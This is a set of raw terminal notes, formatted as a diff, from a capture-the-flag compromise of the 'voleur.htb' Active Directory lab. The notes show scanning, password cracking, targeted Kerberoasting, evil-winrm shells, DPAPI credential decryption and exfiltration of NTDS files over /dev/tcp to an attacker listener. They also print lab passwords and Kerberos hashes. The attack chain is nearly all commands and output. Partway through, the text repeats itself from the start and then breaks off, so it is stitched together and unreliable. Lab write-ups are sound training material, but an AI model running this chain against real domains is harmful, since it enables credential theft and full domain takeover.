@@ -1,0 +1,788 @@
+└─$ nmap -p- -sSCV 10.10.11.76 --min-rate 999
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 23:20 AEST
+Nmap scan report for 10.10.11.76
+Host is up (0.21s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 17:23:56Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
+|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
+|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+57022/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+57023/tcp open  msrpc         Microsoft Windows RPC
+57034/tcp open  msrpc         Microsoft Windows RPC
+57042/tcp open  msrpc         Microsoft Windows RPC
+57056/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+
+ollowing account: ryan.naylor / HollowOct31Nyt
+
+
+─$ bloodhound-python  -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.10.11.76 -c All --zip 
+ Could not authenticate to LDAP. Check your credentials and LDAP server requirements
+
+
+//request TGT
+└─$ impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ryan.naylor.ccache
+
+└─$ netexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
+SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
+SMB         dc.voleur.htb   445    dc               -----           -----------     ------
+SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
+SMB         dc.voleur.htb   445    dc               C$                              Default share
+SMB         dc.voleur.htb   445    dc               Finance                         
+SMB         dc.voleur.htb   445    dc               HR                              
+SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
+SMB         dc.voleur.htb   445    dc               IT              READ            
+SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
+
+└─$ smbclient //10.10.11.76/IT --user=ryan.naylor --password='HollowOct31Nyt' -L
+session setup failed: NT_STATUS_NOT_SUPPORTED
+
+
+//use impacket toolkit instead
+└─$ impacket-smbclient -k dc.voleur.htb
+
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# cd IT
+[-] No share selected
+# cd /IT
+[-] No share selected
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 06:09:59 2025 ..
+drw-rw-rw-          0  Wed Jan 29 20:40:17 2025 First-Line Support
+# cd First-Line Support
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:40:17 2025 .
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
+-rw-rw-rw-      16896  Fri May 30 08:23:36 2025 Access_Review.xlsx
+# get Access_Review.xlsx
+# exit
+
+//this xlsx file rquires psswd, crack it by john
+
+└─$ scp Access_Review.xlsx ed@192.168.56.1:/tmp/                                          
+ed@192.168.56.1's password: 
+Access_Review.xlsx                                                                         100%   17KB   8.3MB/s   00:00    
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ office2john Access_Review.xlsx > hash
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ john hash --wordlist=~/tools/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2013 for all loaded hashes
+Cost 2 (iteration count) is 100000 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football1        (Access_Review.xlsx)     
+1g 0:00:00:02 DONE (2025-08-21 22:42) 0.3533g/s 279.8p/s 279.8c/s 279.8C/s football1..capricorn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+User	Job Title	Permissions	Notes
+Ryan.Naylor	First-Line Support Technician	SMB	Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
+Marie.Bryant	First-Line Support Technician	SMB	
+Lacey.Miller	Second-Line Support Technician	Remote Management Users	
+///Todd.Wolfe	Second-Line Support Technician	Remote Management Users	Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
+Jeremy.Combs	Third-Line Support Technician	Remote Management Users.	Has access to Software folder.
+Administrator	Administrator	Domain Admin	Not to be used for daily tasks!
+			
+			
+Service Accounts			
+svc_backup	 	Windows Backup	Speak to Jeremy!
+svc_ldap		LDAP Services	P/W - M1XyC9pW7qT5Vn
+svc_iis		IIS Administration	P/W - N5pXyW1VqM7CZ8
+svc_winrm		Remote Management 	Need to ask Lacey as she reset this recently.
+
+
+
+
+//bloodhound get AD view
+└─$ bloodhound-python  -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.10.11.76 -c All --zip -k
+
+//svc_ldap has writeSPN to svc_winrm, and Gwrite to lacey who can reset password to svc_winrm
+
+└─$ python3 ~/tools/AD/targetedKerberoast.py -d voleur.htb -u SVC-LDAP -p M1XyC9pW7qT5Vn -v
+        ldap3.core.exceptions.LDAPBindError: automatic bind not successful - invalidCredentials
+        //still not allowded to use credential
+
+└─$ impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'   
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_ldap.ccache
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ export KRB5CCNAME=svc_ldap.ccache 
+
+//use this hash to get svc_winrm hash
+
+└─$ python3 ~/tools/AD/targetedKerberoast.py --dc-host dc.voleur.htb -d voleur.htb -u svc_ldap -k -v
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (lacey.miller)
+[+] Printing hash for (lacey.miller)
+$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$276e0bd14c363c5d2f1cb9892a21f6e6$8e0af888860874f8ec4fe3417261b5a2e93572ebcc403910d2890ff5cd7e45e35a9f532f06540c0aea49d91ac2d620992d1c8084b8e32d4b79b8bcf0c622f9c345397e6fb77d636ec36a55f14f3942487d6c513cc491ed50d135dcc01702814fdfb9d3976d5318130c6aa9a81bb485549c00ab32235baa9336071d62a8a63a039e002aab4840ec0ba485fa769b194fafbbef91f18e3c106df14d892a3a87cb7bbc8416ec74eb3b8c5ed91c33d77a51b14860ce8b245e61a23c6b6fb123e2c69895b1c4d8628fc75c1a2f5c5a5483eee282f9f2518d019e246813495c093247d6c18c2a4c49c4e0930139dcbf7db48827665fd223d953493caeaffd5959b5bf2bfe5e70e4008184c25004f40fc4125f83e15b0247f8abc15f22b487025b4ec844a6ffce9726501b3af8750cfa71b0124f7fdd06dd5f62e6161841126e638a2a4addea0699154303132673113cb5335cd7361e22691789d0b93ffe1bc29b2efb56b9b546f05af975ec1f9a8561157c90d4198c0e1f9f932baa068050c8eae7b49c8546d0fc925e661595f8c48457be5b3255de3caf0cb6687a7437bfc480fad808c13f9d9e9e7ff1789af26636a4aded701bee9a40e0dd95f4f3bacd608a2c0ea7e66d62ece8f5012f06dee0f114ad565c49620d75d83ba3b6b1a7221974c5c6af2d0afd42ff65862b782e660876067f6a9b14218b02b718b3d2481953e510e30dcc39564c55eb9c75a90e7925c14b0cfbd39ca4cf8bcbe0157aaa6b35593ccad36ba68efbb1e8508e715824a9a594c3e21e0ae4d144d8a287b17f8797c8df842f1a13ae3f68abc060c48c3071d73efb45705690c462e9253bc03d6c8431bdf22df89e31eec978582614d6fd2bd09a4afe3e3641f08f00ea8dc72f492b2522d09c920958740a2d4e69d16f631e5d8d3d143a784acca570a9e4df34b829ba9ab19626b5ee0fa21930a96b080e93a1d83530a44484dc11e41ca8699e4ec3ed34351c470fc41f47a4e78018d0e32cd62c5f9c10209a28846a0569b7a45c1c0fba1f81de4f793491aa06f17f1faa237ae2416f6166be89a45753da2f5c30596cbde220bd507bb4d3b127d2f494a5ff24227e04acc6d68d812dec6be3de9a1b2b79a31ef079634535991e46964d8f6703ee5559a6180c112eef044a41f5e5cbdea9a5cc610da1d0b1c7b6091ea5911452a3ee94bf7ff9dace6d75a48e139c46c75f5c38eb76fd534c8d9d4cfde28d50d3bf7674a118cc32c6052146451f5dbcaa50758fbc4b7cc1c3263890c0e4087bc8f6012e92bb6f963137be935d3f969ddd101da26a21ae53867d0bbbe2fd6bdecd04c313c60a1da7055e9f87cfaed0d1cdd55e54c668c7dc0f1262736fbabc519f7f7146d1feeeeb1acd92eebc4656cd655bb864ada0007d2a9271dcb68065aa32d045768781be519568605d2d4c75e479fa82a9da35d7ae3e25d003ba913e5187cda70434e11f
+[VERBOSE] SPN removed successfully for (lacey.miller)
+[VERBOSE] SPN added successfully for (svc_winrm)
+[+] Printing hash for (svc_winrm)
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e70d824bafa7ba157962fdbde9d3b83f$eee6d8defb202f4fe5946c66f707e430f00dc9b710af8f7d141f08038abd78bc072eb5bd744b12bf8869381a4d7f28170c463b785474d7fa5eadeea9760396a75c7136ba71431c816a822ee786fe74a68e18b414f2487cf6e1d8fe69eee0f6b16dcf0d824ef2f354a671f089e2a0c242c9ababcd591075ca9d104df77d5282fd3fa96a8d585e60e1c98de459dd0112bc3d5f076411c615b34f97174254ae295006fe39cae1565bca94c16280de33ddaf408634f137091c16195d22cb086e731056dec3c866fee4af90152fbb22b573bb6943e6a866e52ffd76d9609b1d93b4ac47c6290b13a783458639b927b7acbb3c68ca1d026a7d4192359df5a1a0459bc541908163dab61bf6ea1d15eb204a879755949bf6985656c82ef8dc10ee7bce8c10b726212196cea6b163b748c7f27d0f44a40f27a1e05c5b9608015edd743b86bc21681d953c822161330a2e1df5df4085a039f14f6620aa88656343ee41ea282a3edec2a5aec7b628e483a7652753bc6f75907ccba3da4fcc60f9a9ffb91096dba2d57b46c1fa40f6e62c9e64b41f9276b0969dd5fdcf77eb1fddc2a052abd7d1a743d90799aa1091f489b0d2f191e47913c7563d88b63758658b08d0df71716e6c8f27ffdb91f9221286049489ea732be7ccbe0eaa345c428a9c75e40fa4d7b17d42ff97ba207997f857221237616eb0c5bf465b136e2555f136c80d9a31801afd0518f9265de60c4ff8737afa66ad1182272189dc6219fcef38ae476d14b13aa1c80e81e78147e47c98a7fa8992c3e2b7aeae93e3140932101bc1a8ddca47ac564eb57623cc92399f5f4751c2350b0030a119e9c188a5e7e25ebfd4b01dd569709c973199d83e6ab51285f5d66a61962f96facce3f17a4d968f4f82078e3b618abab26352c70ea7089248603da20c6cc9f62cb51f70ab32f70096f89589c176de6c26997036252193fee0b4d77e2502746e85cebb280f838bbaf2ec34e3fa1ed52e8869751174e5c81fe8827f706eff90ac1676dd799e296fb43aaebf30e857fd030464fbc48ac703a401631bdbdb17faceb25865fd80fbde013b871556915cbb3f882edf80c4da16600739581fc902e119322ebc25dc338fe92dbddf798896e0eba92eff72b09b9ebf1df9ce3c82a7eb3b11f528afe94c05870c2cab9562209fc219469e6fdb2f24e94f19dd83bb44550cc43084f77f3f81e4a4c3c5055d2b88f198481efb43edf456708dfac3740f64b581cc6aa5ee295aaa9016e5d54fed18b844b3eb63e5d41ae255d79479c8afe6cc53be5e236a4a59f2ec58607c73b41b942f0c4a7fe18cd58d84924c4df4b823341f155f6f163a88174f7f6fc105bfc57994e0f3bdbfd9def90c3257e5c9105b3daed1dff9c0b0c32aed7c8f4c10772af6ef3180d19a8b6ceea2c533266dc5cddd085a17e386621a0773c7cdcf8d1147f046f29bbb0c764f1a47c246b6473512d9
+[VERBOSE] SPN removed successfully for (svc_winrm)
+
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ john hash_svcwin --wordlist=~/tools/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+AFireInsidedeOzarctica980219afi (?)     
+1g 0:00:00:05 DONE (2025-08-22 00:34) 0.1757g/s 2016Kp/s 2016Kc/s 2016KC/s AG156228..AEGIES
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ evil-winrm -i voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type ArgumentError happened, message is unknown type: 2061232681
+//still cannot use password, tried to get tgt 
+
+└─$ impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache
+
+
+//
+
+└─$ evil-winrm -i DC.VOLEUR.HTB -k svc_winrm.ccache -r VOLEUR.HTB
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: Useless cert/s provided, SSL is not enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\svc_winrm\desktop> dir
+
+
+    Directory: C:\Users\svc_winrm\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
+-ar---         8/21/2025   4:17 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\desktop> type user.txt
+0956bcdf7c29019070b3758da1745be8
+
+└─$ nc -nvlp 8821           
+listening on [any] 8821 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.11.76] 53907
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
+Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+
+PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd wolfe*"' -IncludeDeletedObjects | restore-ADObject
+Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd wolfe*"' -IncludeDeletedObjects | restore-ADObject
+PS C:\Windows\system32> net user /domain
+net user /domain
+
+User accounts for \\DC
+
+-------------------------------------------------------------------------------
+Administrator            krbtgt                   svc_ldap                 
+todd.wolfe               
+The command completed successfully.
+
+
+
+─$ export KRB5CCNAME=todd.wolfe.ccache                            
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ impacket-smbclient -k dc.voleur.htb                         
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# ls
+[-] No share selected
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# use Finance
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 06:09:59 2025 ..
+drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 Second-Line Support
+# cd Second-Line Support
+# ls
+drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 .
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
+drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 Archived Users
+# cd Archived Users
+# ls
+drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 .
+drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 ..
+drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 todd.wolfe
+# cd todd.wolfe
+
+ get DFBE70A7E5CC19A398EBF1B96859CE5D
+
+
+# get 08949382-134f-4c63-b93c-ce52efc0aa88
+# pwd
+/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
+
+PS C:\Windows\system32> wmic useraccount get name,sid
+wmic useraccount get name,sid
+Name           SID                                             
+Administrator  S-1-5-21-3927696377-1337352550-2781715495-500   
+krbtgt         S-1-5-21-3927696377-1337352550-2781715495-502   
+svc_ldap       S-1-5-21-3927696377-1337352550-2781715495-1106  
+todd.wolfe     S-1-5-21-3927696377-1337352550-2781715495-1110  
+
+└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+
+//get a new user crendential
+
+└─$ impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m' 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in jeremy.combs.ccache
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ export KRB5CCNAME=jeremy.combs.ccache                          
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ impacket-smbclient -k dc.voleur.htb                        
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 06:09:59 2025 ..
+drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 Third-Line Support
+# cd Third-Line Support
+# ls
+drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 .
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
+-rw-rw-rw-       2602  Fri Jan 31 03:11:29 2025 id_rsa
+-rw-rw-rw-        186  Fri Jan 31 03:07:35 2025 Note.txt.txt
+# get Note.txt.txt
+# get id_rsa
+# exit
+
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ cat Note.txt.txt      
+Jeremy,
+
+I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin                                                                                                                 
+
+//so guess the privi key is belonged to svc_backup(noticed in bloodhound)
+└─$ chmod 600 id_rsa   
+└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222
+
+
+cd mnt/c/IT/Third-Line Support/backups/Active Directory
+
+//sent to kali
+└─$ nc -nvlp 8822 > SYSTEM  
+listening on [any] 8822 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.11.76] 54348
+
+cat ntds.jfm > /dev/tcp/10.10.16.33/8822
+└─$ nmap -p- -sSCV 10.10.11.76 --min-rate 999
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 23:20 AEST
+Nmap scan report for 10.10.11.76
+Host is up (0.21s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 17:23:56Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
+|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
+|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+57022/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+57023/tcp open  msrpc         Microsoft Windows RPC
+57034/tcp open  msrpc         Microsoft Windows RPC
+57042/tcp open  msrpc         Microsoft Windows RPC
+57056/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+
+ollowing account: ryan.naylor / HollowOct31Nyt
+
+
+─$ bloodhound-python  -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.10.11.76 -c All --zip 
+ Could not authenticate to LDAP. Check your credentials and LDAP server requirements
+
+
+//request TGT
+└─$ impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ryan.naylor.ccache
+
+└─$ netexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
+SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
+SMB         dc.voleur.htb   445    dc               -----           -----------     ------
+SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
+SMB         dc.voleur.htb   445    dc               C$                              Default share
+SMB         dc.voleur.htb   445    dc               Finance                         
+SMB         dc.voleur.htb   445    dc               HR                              
+SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
+SMB         dc.voleur.htb   445    dc               IT              READ            
+SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
+
+└─$ smbclient //10.10.11.76/IT --user=ryan.naylor --password='HollowOct31Nyt' -L
+session setup failed: NT_STATUS_NOT_SUPPORTED
+
+
+//use impacket toolkit instead
+└─$ impacket-smbclient -k dc.voleur.htb
+
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# cd IT
+[-] No share selected
+# cd /IT
+[-] No share selected
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 06:09:59 2025 ..
+drw-rw-rw-          0  Wed Jan 29 20:40:17 2025 First-Line Support
+# cd First-Line Support
+# ls
+drw-rw-rw-          0  Wed Jan 29 20:40:17 2025 .
+drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
+-rw-rw-rw-      16896  Fri May 30 08:23:36 2025 Access_Review.xlsx
+# get Access_Review.xlsx
+# exit
+
+//this xlsx file rquires psswd, crack it by john
+
+└─$ scp Access_Review.xlsx ed@192.168.56.1:/tmp/                                          
+ed@192.168.56.1's password: 
+Access_Review.xlsx                                                                         100%   17KB   8.3MB/s   00:00    
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ office2john Access_Review.xlsx > hash
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ john hash --wordlist=~/tools/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2013 for all loaded hashes
+Cost 2 (iteration count) is 100000 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football1        (Access_Review.xlsx)     
+1g 0:00:00:02 DONE (2025-08-21 22:42) 0.3533g/s 279.8p/s 279.8c/s 279.8C/s football1..capricorn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+User	Job Title	Permissions	Notes
+Ryan.Naylor	First-Line Support Technician	SMB	Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
+Marie.Bryant	First-Line Support Technician	SMB	
+Lacey.Miller	Second-Line Support Technician	Remote Management Users	
+///Todd.Wolfe	Second-Line Support Technician	Remote Management Users	Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
+Jeremy.Combs	Third-Line Support Technician	Remote Management Users.	Has access to Software folder.
+Administrator	Administrator	Domain Admin	Not to be used for daily tasks!
+			
+			
+Service Accounts			
+svc_backup	 	Windows Backup	Speak to Jeremy!
+svc_ldap		LDAP Services	P/W - M1XyC9pW7qT5Vn
+svc_iis		IIS Administration	P/W - N5pXyW1VqM7CZ8
+svc_winrm		Remote Management 	Need to ask Lacey as she reset this recently.
+
+
+
+
+//bloodhound get AD view
+└─$ bloodhound-python  -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.10.11.76 -c All --zip -k
+
+//svc_ldap has writeSPN to svc_winrm, and Gwrite to lacey who can reset password to svc_winrm
+
+└─$ python3 ~/tools/AD/targetedKerberoast.py -d voleur.htb -u SVC-LDAP -p M1XyC9pW7qT5Vn -v
+        ldap3.core.exceptions.LDAPBindError: automatic bind not successful - invalidCredentials
+        //still not allowded to use credential
+
+└─$ impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'   
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_ldap.ccache
+                                                                                                                             
+┌──(ed㉿kali)-[~/oscptest/voleur.htb]
+└─$ export KRB5CCNAME=svc_ldap.ccache 
+
+//use this hash to get svc_winrm hash
+
+└─$ python3 ~/tools/AD/targetedKerberoast.py --dc-host dc.voleur.htb -d voleur.htb -u svc_ldap -k -v
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (lacey.miller)
+[+] Printing hash for (lacey.miller)
